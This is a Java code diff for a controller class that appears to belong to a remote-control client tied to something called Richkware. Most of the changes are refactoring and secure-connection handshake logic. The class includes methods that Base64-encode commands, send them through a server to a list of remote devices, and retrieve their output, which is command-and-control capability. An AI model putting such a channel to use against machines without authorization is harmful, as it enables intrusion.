@@ -1,24 +1,24 @@
-package it.richkmeli.RMC.controller;
+package it.richkmeli.rmc.controller;
 
 import com.google.gson.Gson;
 import com.google.gson.reflect.TypeToken;
-import it.richkmeli.RMC.controller.network.Network;
-import it.richkmeli.RMC.controller.network.SocketCallback;
-import it.richkmeli.RMC.controller.network.SocketThread;
-import it.richkmeli.RMC.model.Device;
-import it.richkmeli.RMC.model.ModelException;
-import it.richkmeli.RMC.swing.ListCallback;
-import it.richkmeli.RMC.swing.RichkwareCallback;
-import it.richkmeli.RMC.utils.Logger;
-import it.richkmeli.RMC.utils.ResponseParser;
 import it.richkmeli.jframework.crypto.Crypto;
+import it.richkmeli.jframework.util.Logger;
+import it.richkmeli.rmc.controller.network.Network;
+import it.richkmeli.rmc.controller.network.SocketCallback;
+import it.richkmeli.rmc.controller.network.SocketThread;
+import it.richkmeli.rmc.model.Device;
+import it.richkmeli.rmc.model.ModelException;
+import it.richkmeli.rmc.swing.ListCallback;
+import it.richkmeli.rmc.swing.RichkwareCallback;
+import it.richkmeli.rmc.utils.ResponseParser;
+import it.richkmeli.rmc.utils.Utils;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
 import java.io.File;
 import java.lang.reflect.Type;
 import java.util.*;
-import java.util.stream.Collectors;
 
 public class Controller {
 
@@ -30,7 +30,7 @@ public class Controller {
 
     private Network network;
     private Crypto.Client cryptoClient;
-    private String clientID;
+    private static String clientID = null;
     private List<String> devicesList;
     private Map<Device, SocketThread> devicesMap;
 
@@ -178,7 +178,12 @@ public class Controller {
 //    }
 
     public void connectDevice(List<Device> devices) {
-        devicesList = devices.stream().map(Device::getName).collect(Collectors.toList());
+        List<String> list = new ArrayList<>();
+        for (Device device : devices) {
+            String name = device.getName();
+            list.add(name);
+        }
+        devicesList = list;
     }
 
 //
@@ -194,16 +199,16 @@ public class Controller {
 
     public void reverseCommand(String commands, boolean encryption, RichkwareCallback callback) {
         String[] commandsArray = commands.split("\n");
-        String encodedCommands = "";
+        StringBuilder encodedCommands = new StringBuilder();
         for (int i = 0; i < commandsArray.length; i++) {
-            encodedCommands += (Base64.getEncoder().encodeToString(commandsArray[i].getBytes()));
+            encodedCommands.append(Base64.getEncoder().encodeToString(commandsArray[i].getBytes()));
             if (i != commandsArray.length - 1)
-                encodedCommands += "##";
+                encodedCommands.append("##");
         }
-        encodedCommands = Base64.getEncoder().encodeToString(encodedCommands.getBytes());
+        encodedCommands = new StringBuilder(Base64.getEncoder().encodeToString(encodedCommands.toString().getBytes()));
         JSONObject jsonParameters = new JSONObject()
                 .put("devices", new JSONArray(devicesList))
-                .put("commands", encodedCommands);
+                .put("commands", encodedCommands.toString());
 
         //TODO encryption
         network.putRequest("command", jsonParameters.toString(), null, new NetworkCallback() {
@@ -223,12 +228,12 @@ public class Controller {
 
     }
 
-    public void reverseCommandResponse(Device device, RichkwareCallback callback) {
+    public void reverseCommandResponse(RichkwareCallback callback) {
         JSONObject jsonParameters = new JSONObject();
-        jsonParameters.put("data0", device.getName());
-        jsonParameters.put("data1", "client");
+
+        jsonParameters.put("data0", devicesList.get(0));
         //TODO encryption
-        network.getRequest("command", jsonParameters.toString(), null, new NetworkCallback() {
+        network.getRequest("command", jsonParameters.toString(), cryptoClient, new NetworkCallback() {
             @Override
             public void onSuccess(String response) {
                 if (ResponseParser.isStatusOK(response))
@@ -280,12 +285,13 @@ public class Controller {
 
     public void deleteCryptoState() {
         cryptoClient.reset();
+        network.deleteSession();
     }
 
-    private void asyncInit(Map<String, Object> map, int attempt, RichkwareCallback callback) { //callback chiamata allo stato 3
+    private void asyncInit(Map<String, Object> map, int attempt, RichkwareCallback callback) { // callback chiamata allo stato 3
         String clientResponse = cryptoClient.init((File) map.get(SECURE_DATA_CLIENT), (String) map.get(CLIENT_KEY), (String) map.get(SERVER_RESPONSE));
 
-        Logger.i(clientResponse);
+        Logger.info(clientResponse);
 
         int clientState = new JSONObject(clientResponse).getInt("state");
 
@@ -293,16 +299,22 @@ public class Controller {
         parametersJson.put("clientID", clientID);
         parametersJson.put("data", new JSONObject(clientResponse).getString("payload"));
 
-        Logger.i("clientState: " + clientState);
+        Logger.info("clientState: " + clientState);
 
         getNetwork().getRequestCompat("secureConnection", parametersJson.toString(), new NetworkCallback() {
             @Override
             public void onSuccess(String response) {
                 if (attempt < SECURE_CONNECTION_MAX_ATTEMPT) {
-                    if (clientState != 3) {
+
+                    String clientResponse = cryptoClient.init((File) map.get(SECURE_DATA_CLIENT), (String) map.get(CLIENT_KEY), response);
+                    int clientState = new JSONObject(clientResponse).getInt("state");
+                    Logger.info("clientState: " + clientState);
+                    if (clientState == -1) {
+                        callback.onFailure("Corrupted state");
+                    } else if (clientState != 3) {
                         map.remove(SERVER_RESPONSE);
                         map.put(SERVER_RESPONSE, response);
-                        Logger.i(map.get(SECURE_DATA_CLIENT) + " " + (String) map.get(CLIENT_KEY) + " " + (String) map.get(SERVER_RESPONSE));
+                        Logger.info(map.get(SECURE_DATA_CLIENT) + " " + (String) map.get(CLIENT_KEY) + " " + (String) map.get(SERVER_RESPONSE));
                         asyncInit(map, attempt + 1, callback);
                     } else {
                         //TODO chaiamata a se stesso se stato <3, oppure chiama callback
@@ -320,10 +332,18 @@ public class Controller {
         });
     }
 
-    public void initSecureConnection(RichkwareCallback callback) {
-        Logger.i("initSecureConnection...");
+    private void setClientID() {
+        if (clientID == null) {
+            String id = "RMC_" + Utils.getDeviceIdentifier();
+            clientID = Base64.getUrlEncoder().encodeToString(id.getBytes());
+        }
+        Logger.info(Utils.getDeviceInfo());
+    }
 
-        this.clientID = "RMC_001";
+    public void initSecureConnection(RichkwareCallback callback) {
+        Logger.info("initSecureConnection...");
+
+        setClientID();
 
         //TODO verificare che non si leghi ad un unico server, altrimenti diverso file TXT, nome server nel file TXT
         // re-init to allow a connection to a different server
